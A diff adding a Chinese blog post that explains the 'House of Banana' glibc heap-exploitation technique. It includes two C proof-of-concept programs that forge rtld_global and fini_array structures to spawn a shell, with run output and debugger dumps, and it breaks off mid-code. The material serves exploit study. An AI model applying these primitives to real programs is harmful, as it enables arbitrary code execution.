@@ -156,6 +156,123 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/09/House%20Of%20Banana-%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/09/House%20Of%20Banana-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Banana-原理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-04-09 19:01:29 / Modified: 23:45:39" itemprop="dateCreated datePublished" datetime="2022-04-09T19:01:29+08:00">2022-04-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>8.6k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>8 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="House-Of-Banana"><a href="#House-Of-Banana" class="headerlink" title="House Of Banana"></a>House Of Banana</h2><p>libc-2.28：_int_malloc 中增加了对 unsorted bin 的BK的校验，使得 unsorted bin attack 变得不可行</p>
+<p>libc-2.29：检查变得更加严格，house of strom 不能用了</p>
+<p>libc-2.30：常规 large bin attack 方法也被限制（以前可以改两个地址，现在只能改一个了）</p>
+<p>house of banana 适用场景：（满足任一条件即可）</p>
+<ul>
+<li>程序能够显式的执行exit函数</li>
+<li>程序通过 libc_start_main 启动的主函数，且主函数能够结束</li>
+</ul>
+<hr>
+<h2 id="House-Of-Banana-原理"><a href="#House-Of-Banana-原理" class="headerlink" title="House Of Banana 原理"></a>House Of Banana 原理</h2><p>在 ld.so 里，存在一个 <code>_rtld_global</code> 指针，指向 <code>rtld_global</code> 结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Once libc.so has been loaded into the namespace, this points to</span></span><br><span class="line"><span class="comment">       its link map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">libc_map</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> hashval;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="keyword">size_t</span> size;</span><br><span class="line">      <span class="keyword">size_t</span> n_elements;</span><br><span class="line">      <span class="keyword">void</span> (*<span class="built_in">free</span>) (<span class="keyword">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  <span class="comment">/* One higher than index of last used namespace.  */</span></span><br><span class="line">  EXTERN <span class="keyword">size_t</span> _dl_nns;</span><br><span class="line">.................................................................................</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><code>rtld_global</code> 结构体里面装有 <code>_dl_ns</code> 结构体，该结构体存储着的实际就是elf各段的符号结构体（我们较为关注的是 fini_array 段的动态链接结构体指针）</p>
+<p>fini_array 段的动态链接结构体指针会在以下代码中被使用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">            + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">            / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因此，伪造该结构体指针，可以使得 array 指向我们可控的数据区，从而布置下一系列函数，进而劫持程序的流</p>
+<p>那么 house of banana 的思想就是利用 large bin attack 往 rtld_global 写入堆的地址，并事先在堆里伪造好 rtld_global 结构体，这样程序 exit 或者正常退出 main 函数时，便会执行到伪造的 fini_array 数组</p>
+<h2 id="House-Of-Banana-利用姿势"><a href="#House-Of-Banana-利用姿势" class="headerlink" title="House Of Banana 利用姿势"></a>House Of Banana 利用姿势</h2><p>案例一：间接利用“rtld_global”</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">getLibcBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">uint64_t</span> to;</span><br><span class="line">   <span class="keyword">uint64_t</span> from;</span><br><span class="line">   <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">   </span><br><span class="line">   FILE* file;</span><br><span class="line">   <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/maps&quot;</span>,(<span class="keyword">int</span>)getpid()); </span><br><span class="line">   file = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf, <span class="keyword">sizeof</span>(buf), file)) </span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;libc&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">          fclose(file);</span><br><span class="line">          <span class="keyword">return</span> from;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span> libcBase = getLibcBase();</span><br><span class="line">	<span class="keyword">uint64_t</span> rtld_global = libcBase+<span class="number">0x1fa000</span>+<span class="number">0x2E060</span>;</span><br><span class="line">	<span class="keyword">uint64_t</span>* next_node = (<span class="keyword">uint64_t</span>*)(rtld_global<span class="number">-0x35f48</span>);   </span><br><span class="line">    <span class="comment">/* distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>); <span class="comment">/* 为了触发 largebin attack */</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>); <span class="comment">/* p1-&gt;size和p2-&gt;size必须不相同 */</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span> fake = (<span class="keyword">uint64_t</span>)p2<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x28</span>)  = fake;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x31c</span>) = <span class="number">0x1c</span>;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x110</span>) = fake+<span class="number">0x40</span>;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x48</span>)  = fake+<span class="number">0x58</span>;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x58</span>)  = (<span class="keyword">uint64_t</span>)shell;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x120</span>) = fake+<span class="number">0x48</span>;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x50</span>)  = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;libcBase is 0x%lx\n&quot;</span>,libcBase);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;rtld_global is 0x%lx\n&quot;</span>,rtld_global);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	<span class="keyword">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>); <span class="comment">//force p1 insert in to the largebin</span></span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	p1[<span class="number">3</span>] = ((<span class="keyword">uint64_t</span>)next_node <span class="number">-0x20</span>); <span class="comment">//push p2 into unsoteded bin</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>); <span class="comment">//force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">	p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	p2[<span class="number">3</span>] = fake;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 gcc ./test.c -o test -g                                                   </span><br><span class="line">➜  桌面 patchelf --<span class="built_in">set</span>-interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9_amd64/ld<span class="number">-2.31</span>.so --<span class="built_in">set</span>-rpath /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9_amd64 test</span><br><span class="line">➜  桌面 ./test                                                                   </span><br><span class="line">libcBase is <span class="number">0x7f678f5f5000</span></span><br><span class="line">rtld_global is <span class="number">0x7f678f81d060</span></span><br><span class="line">$ whoami</span><br><span class="line">yhellow</span><br></pre></td></tr></table></figure>
+<p>这里先说一下这两个关键的偏移（“rtld_global”，“next_node”）是怎么得出来的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line"><span class="number">0x7ffff7ffd060</span>-&gt;<span class="number">0x7ffff7fc7118</span> is <span class="number">-0x35f48</span> bytes (<span class="number">-0x6be9</span> words)</span><br></pre></td></tr></table></figure>
+<p>先计算“rtld_global”的偏移，然后“next_node”的偏移也计算出来了</p>
+<p>这种类型的 House Of Banana 是针对“next_node”进行攻击的，利用 largebin attack 在“next_node”中写入“fake”</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/xg fake</span><br><span class="line"><span class="number">0x55555555bcd0</span>:	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; telescope *next_node <span class="comment">/* next_node-&gt;fake */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax <span class="number">0x55555555bcd0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x55555555bcd8</span> ◂— <span class="number">0x421</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x55555555bce0</span> —▸ <span class="number">0x7ffff7fc0fd0</span> (main_arena+<span class="number">1104</span>) —▸ <span class="number">0x7ffff7fc0fc0</span> (main_arena+<span class="number">1088</span>) —▸ <span class="number">0x7ffff7fc0fb0</span> (main_arena+<span class="number">1072</span>) —▸ <span class="number">0x7ffff7fc0fa0</span> (main_arena+<span class="number">1056</span>) ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x55555555bce8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x55555555bcf0</span> —▸ <span class="number">0x55555555b880</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rdx <span class="number">0x55555555bcf8</span> —▸ <span class="number">0x55555555bcd0</span> ◂— <span class="number">0x0</span> <span class="comment">/* fake+0x28 */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x55555555bd00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x55555555bd08</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55555555bd10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55555555bd18</span> —▸ <span class="number">0x55555555bd28</span> —▸ <span class="number">0x5555555552c9</span> (shell) ◂— endbr64 </span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x55555555bd20</span> ◂— <span class="number">0x8</span> <span class="comment">/* fake+0x50 */</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x55555555bd28</span> —▸ <span class="number">0x5555555552c9</span> (shell) ◂— endbr64 <span class="comment">/* fake+0x58 */</span></span><br></pre></td></tr></table></figure>
+<p>案例二：直接利用“rtld_global”</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;you hacked me!!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;house of banana&#x27;s poc&quot;</span>);</span><br><span class="line">   <span class="keyword">size_t</span> libc_base = &amp;<span class="built_in">puts</span> - <span class="number">554128</span>;</span><br><span class="line">   <span class="keyword">size_t</span> _rtld_global_ptr_addr = libc_base + <span class="number">2252896</span>;</span><br><span class="line">   <span class="keyword">char</span> *ptr0 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line">   <span class="keyword">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">char</span> *ptr2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;libc_base is 0x%lx\n&quot;</span>,libc_base);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;_rtld_global_ptr_addr is 0x%lx\n&quot;</span>,_rtld_global_ptr_addr);</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">free</span>(ptr0);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//put ptr0 into large bin</span></span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">free</span>(ptr1); <span class="comment">//free ptr1 into unsorted bin</span></span><br><span class="line">   <span class="built_in">free</span>(ptr2); <span class="comment">//free ptr2 into unsorted bin</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//bk_nextsize = _rtld_global_ptr_addr</span></span><br><span class="line">   *(<span class="keyword">size_t</span> *)(ptr0 + <span class="number">0x18</span>) = _rtld_global_ptr_addr - <span class="number">0x20</span>;</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x410</span>); <span class="comment">//large bin attack to hijack _rtld_global_ptr</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">//fake a _rtld_global</span></span><br><span class="line">   <span class="keyword">size_t</span> fake_rtld_global_addr = ptr1 - <span class="number">0x10</span>;</span><br><span class="line">   <span class="keyword">size_t</span> *fake_rtld_global = (<span class="keyword">size_t</span> *)ptr1;</span><br><span class="line">   <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//the chain&#x27;s length must &gt;= 4</span></span><br><span class="line">   fake_rtld_global[<span class="number">1</span>] = &amp;fake_rtld_global[<span class="number">2</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">3</span>] = fake_rtld_global_addr;</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">8</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//fake a fini_array segment</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x20</span>] = &amp;fake_rtld_global[<span class="number">0x30</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x22</span>] = &amp;fake_rtld_global[<span class="number">0x23</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x23</span>+<span class="number">1</span>] = <span class="number">0x8</span>; <span class="comment">//func ptrs total len</span></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">0x30</span>] = <span class="number">0x1A</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">0x31</span>] = <span class="number">0</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">-2</span>] = &amp;fake_rtld_global[<span class="number">0x32</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//funcs</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x32</span>] = backdoor;</span><br><span class="line">   fake_rtld_global[<span class="number">0x61</span>] = <span 